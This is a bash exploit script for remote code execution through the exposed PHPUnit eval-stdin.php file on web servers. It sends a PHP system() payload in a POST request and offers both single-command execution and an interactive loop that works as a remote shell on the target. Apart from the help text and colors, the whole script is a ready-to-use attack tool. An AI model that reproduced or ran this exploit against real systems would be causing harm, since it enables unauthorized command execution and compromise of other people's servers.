#!/bin/bash

#Colors
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n${red}[!] Exiting...${end}"
  tput cnorm; exit 1
}

trap ctrl_c INT

function helpPanel(){
  echo -e "\n${red}[!] Use: $0${end}"
  for i in $(seq 1 80); do echo -ne "${red}―${end}"; done
  echo -e "\n\n\t${blue}┃${end}  ${purple}[-u]${end} ${yellow}Url${end}"
  echo -e "\t${blue}┃${end}  ${purple}[-e]${end} ${yellow}Execute${end}"
  echo -e "\t${blue}┃${end}  ${purple}[-i]${end} ${yellow}Interactive mode${end}"
  echo -e "\t${blue}┃${end}  ${purple}[-h]${end} ${yellow}Show this help panel${end}"
  echo -e "\n\t${purple}Use examples:${end}"
  echo -e "\n\t\t${green}$0${end} ${turquoise}-i${end}"
  echo -e "\t\t${green}$0${end} ${turquoise}-u${end} ${gray}http://vulnsite.com${end} ${turquoise}-e${end} ${gray}whoami${end}"
  exit 1
}

function makeRequest(){
  tput civis; echo; curl -s -X POST -d "<?php system(\"$execute\");?>" "$url/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"; tput cnorm
}

function interactive(){
  echo -ne "${yellow}爵[url] ${end} "; read -r url

  while true; do
    echo -ne "\n${green}█   ${end} "; read -r cmd
    if [[ $cmd == "exit" || $cmd == "quit" ]]; then
      echo -e "\n${blue}[${purple}~${blue}] ${purple}Bye!${end}"
      tput cnorm; exit 0
    else
      tput civis; echo; curl -s -X POST -d "<?php system(\"$cmd\");?>" "$url/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"; tput cnorm
    fi
  done
}

declare -i parameter_counter=0; while getopts ":e:u:ih:" arg; do
  case $arg in
    e) execute=$OPTARG; let parameter_counter+=1;;
    u) url=$OPTARG; let parameter_counter+=1;;
    i) interactive; let parameter_counter+=2;;
    h) helpPanel;;
  esac
done

if [[ $parameter_counter -ne 2 ]]; then
  helpPanel
else
  if [[ $execute && $url ]]; then
    makeRequest
  fi
fi
